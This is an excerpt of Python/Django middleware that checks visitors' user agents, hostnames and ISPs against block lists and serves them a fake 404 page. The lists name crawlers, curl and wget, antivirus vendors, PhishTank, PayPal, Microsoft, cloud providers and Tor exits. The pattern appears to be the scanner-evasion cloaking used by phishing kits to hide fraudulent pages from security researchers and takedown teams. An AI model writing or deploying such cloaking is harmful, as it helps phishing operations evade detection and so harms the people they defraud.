...
class BlockMiddlewarefour:
    """
    Middleware to block specific user agents, IPs, hostnames, and ISPs.
    """
    ...
    def __call__(self, request):
        ...
        blocked_user_agents = [
         'googlebot','yahoo','slurp','yahooSeeker','facebookexternalhit','ia_archiver','yandexbot','baiduspider','crawler','httrack','pycurl','python-requests','curl','wget','phish','Http Crawler'
        ]
        ...
        blocked_hostnames = [
            ...
            'dreamhost', 'netpilot', 'calyxinstitute', 'tor-exit', 'avast'
        ]

        # List of ISPs to block
        blocked_isps = [
            'DigitalOcean', 'Amazon', 'Google', 'phishtank', 'net4sec', 'AVAST Software s.r.o.',
            'BullGuard ApS', 'PayPal', 'Hotmail', 'Yahoo', 'AOL', 'Microsoft', 'Kaspersky Lab',
            'Linode, LLC', 'MSN', 'ONLINE S.A.S.', 'Joshua Peter McQuistan'
        ]
        ...
        # Check if user IP is in blocked list
        for pattern in blocked_ips:
            if re.match(pattern, user_ip):
                return HttpResponse("<h1>404 Not Found</h1>The page that you have requested could not be found.")

        # Check if hostname contains blocked words
        for word in blocked_hostnames:
            if word in hostname.lower():
                return HttpResponse("<h1>404 Not Found</h1>The page that you have requested could not be found.")

        # Get ISP information
        try:
            response = requests.get(f'http://ipinfo.io/{user_ip}/org')
            isp = response.text.strip() if response.status_code == 200 else None
        except Exception as e:
            isp = None

        # Check if ISP is in blocked list
        if isp:
            for blocked_isp in blocked_isps:
                if blocked_isp.lower() in isp.lower():
                    return HttpResponse("<h1>404 Not Found</h1>The page that you have requested could not be found.")
